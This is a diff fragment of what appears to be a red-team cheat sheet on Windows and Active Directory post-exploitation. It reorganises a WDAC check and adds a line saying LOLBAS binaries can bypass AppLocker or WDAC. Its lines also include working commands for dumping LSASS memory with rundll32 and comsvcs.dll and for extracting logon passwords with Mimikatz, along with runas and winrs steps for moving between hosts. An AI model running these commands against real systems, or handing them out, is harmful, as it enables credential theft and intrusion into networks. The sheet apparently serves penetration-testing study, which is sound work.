@@ -422,11 +422,6 @@ Get-DomainGPO -Identity *applocker*
 Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
 ```
 
-#### Check for WDAC
-```
-Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
-```
-
 #### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
 ```
 runas /netonly /user:<DOMAIN\<USER> cmd.exe
@@ -440,13 +435,20 @@ winrs -r:<PC NAME> cmd
 ls C:\Windows\system32\CodeIntegrity
 ```
 
+### WDAC
+#### Check for WDAC
+```
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+```
+
 ### LOLBAS
 - Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/
+- Can be used to bypass Applocker or WDAC
 
 #### rundll32.exe and comsvcs.dll dumping lsass:
 ```
 Get-Process | Select-String lsass
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PROCESS ID> C:\Users\Public\lsass.dmp full
 dir C:\Users\Public\lsass.dmp
 
 Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"'
